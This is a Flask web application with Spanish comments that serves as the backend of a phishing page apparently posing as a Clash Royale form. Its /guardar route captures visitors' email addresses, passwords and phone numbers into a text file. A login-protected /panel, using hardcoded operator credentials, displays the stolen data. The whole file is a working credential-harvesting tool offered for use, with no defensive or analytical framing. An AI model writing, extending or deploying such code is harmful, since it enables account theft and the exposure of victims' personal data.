from flask import Flask, request, session, redirect, render_template_string
from datetime import timedelta

app = Flask(__name__, template_folder='.', static_folder='.', static_url_path='')
app.secret_key = 'clave_secreta_para_juanc_pro_2026'
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=30)

@app.route('/')
def index():
    # Carga tu formulario público de Clash Royale sin restricciones
    return render_template_string(open('index.html').read())

@app.route('/guardar', methods=['POST'])
def guardar():
    c = request.form.get('correo')
    p = request.form.get('password')
    t = request.form.get('telefono')
    with open('datos.txt', 'a') as f:
        f.write(f"{c}|{p}|{t}\n")
    return "Procesando..."

@app.route('/panel', methods=['GET', 'POST'])
def panel():
    # Si ya iniciaste sesión antes, te deja pasar directo sin pedir nada
    if session.get('logged_in'):
        try:
            with open('datos.txt', 'r') as f:
                datos = f.read()
        except FileNotFoundError:
            datos = "No hay datos guardados todavía."
        return f"<h1>Panel de Datos</h1><pre>{datos}</pre><br><a href='/logout'>Cerrar Sesión</a>"

    # Si no estás logueado, pide usuario y contraseña normales (sin trampas que te bloqueen la IP)
    if request.method == 'POST':
        user = request.form.get('usuario')
        pwd = request.form.get('pass')
        
        if user == 'juanc._25' and pwd == 'elprofre':
            session.permanent = True  # Guarda la sesión por 30 días
            session['logged_in'] = True
            return redirect('/panel')
        else:
            return "Credenciales incorrectas. <a href='/panel'>Intentar de nuevo</a>"

    # Formulario de login limpio
    return '''
    <div style="max-width:300px; margin:50px auto; text-align:center; font-family:sans-serif;">
        <h3>Control de Acceso</h3>
        <form method="post">
            <input type="text" name="usuario" placeholder="Usuario" required><br><br>
            <input type="password" name="pass" placeholder="Contraseña" required><br><br>
            <input type="submit" value="Ingresar">
        </form>
    </div>
    '''

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect('/panel')

if __name__ == '__main__':
    app.run()

